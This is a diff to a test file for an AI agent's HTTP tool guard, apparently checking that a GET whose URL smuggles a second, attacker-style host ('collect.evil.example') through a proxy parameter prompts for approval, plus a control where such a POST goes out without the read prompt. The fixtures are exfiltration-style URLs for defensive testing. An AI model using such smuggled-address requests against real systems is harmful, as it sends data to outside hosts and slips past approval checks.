@@ -109,13 +109,24 @@ describe('http_request GET: the listed address and an address it carries', () =>
     expect(tool.sent).toEqual([]);
   });
 
-  it('a GET of a named host that carries an unnamed host for it to fetch is asked about', async () => {
+  it('a GET of a named host whose address carries another one is asked about, headers or not', async () => {
+    for (const extra of [{}, { headers: { Accept: 'application/json' } }]) {
+      const tool = http();
+      const ask = asker('Deny');
+      const agent = agentOf(tool, ask.fn, 'the API is api.example.ch');
+      await call(agent, { url: 'https://api.example.ch/proxy?u=https%3A%2F%2Fcollect.evil.example%2Fd', ...extra });
+      expect(ask.asked).toHaveLength(1);
+      expect(ask.asked[0]).toContain('The address carries another address');
+      expect(tool.sent).toEqual([]);
+    }
+  });
+
+  it('CONTROL: a write whose address carries another one keeps its own check, not the read question', async () => {
     const tool = http();
     const ask = asker('Deny');
     const agent = agentOf(tool, ask.fn, 'the API is api.example.ch');
-    await call(agent, { url: 'https://api.example.ch/proxy?u=https%3A%2F%2Fcollect.evil.example%2Fd' });
-    expect(ask.asked).toHaveLength(1);
-    expect(ask.asked[0]).toContain('"collect.evil.example"');
-    expect(tool.sent).toEqual([]);
+    await call(agent, { url: 'https://api.example.ch/hooks?u=https://collect.evil.example', method: 'POST', body: '{}' });
+    expect(ask.asked).toEqual([]);
+    expect(tool.sent).toEqual(['https://api.example.ch/hooks?u=https://collect.evil.example']);
   });
 });
